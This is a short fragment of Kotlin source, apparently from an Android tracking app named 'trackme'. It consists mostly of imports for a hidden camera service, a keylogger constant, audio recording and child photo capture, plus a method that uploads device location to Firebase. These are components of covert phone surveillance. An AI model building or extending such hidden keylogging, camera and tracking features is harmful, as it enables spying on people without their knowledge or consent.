package com.github.tusarr10.trackme.services.accessibilityData
...
import com.github.tusarr10.trackme.data.model.Photo
import com.github.tusarr10.trackme.data.model.Recording
...
import com.github.tusarr10.trackme.utils.ConstFun.getRandomNumeric
import com.github.tusarr10.trackme.utils.ConstFun.showApp
import com.github.tusarr10.trackme.utils.Consts.ADDRESS_AUDIO_RECORD
import com.github.tusarr10.trackme.utils.Consts.CHILD_CAPTURE_PHOTO
...
import com.github.tusarr10.trackme.utils.Consts.CHILD_SERVICE_DATA
...
import com.github.tusarr10.trackme.utils.Consts.KEY_LOGGER
import com.github.tusarr10.trackme.utils.Consts.KEY_TEXT
...
import com.github.tusarr10.trackme.utils.Consts.TAG
import com.github.tusarr10.trackme.utils.Consts.TIMER
import com.github.tusarr10.trackme.utils.FileHelper
import com.github.tusarr10.trackme.utils.FileHelper.getFileNameAudio
...
import com.github.tusarr10.trackme.utils.MyCountDownTimer
import com.github.tusarr10.trackme.utils.hiddenCameraServiceUtils.CameraCallbacks
import com.github.tusarr10.trackme.utils.hiddenCameraServiceUtils.CameraConfig
import com.github.tusarr10.trackme.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_CAMERA_PERMISSION_NOT_AVAILABLE
import com.github.tusarr10.trackme.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION
import com.github.tusarr10.trackme.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_IMAGE_WRITE_FAILED
import com.github.tusarr10.trackme.utils.hiddenCameraServiceUtils.HiddenCameraService
import com.github.tusarr10.trackme.utils.hiddenCameraServiceUtils.config.CameraFacing
import com.github.tusarr10.trackme.utils.hiddenCameraServiceUtils.config.CameraRotation
...
class InteractorAccessibilityData @Inject constructor(private val context: Context, private val firebase: InterfaceFirebase) : InterfaceAccessibility, CameraCallbacks {
    ...
    override fun setDataLocation(location: Location) {
        if (firebase.getUser() != null) {
            ...
            val model = com.github.tusarr10.trackme.data.model.Location(location.latitude, location.longitude, address, getDateTime())
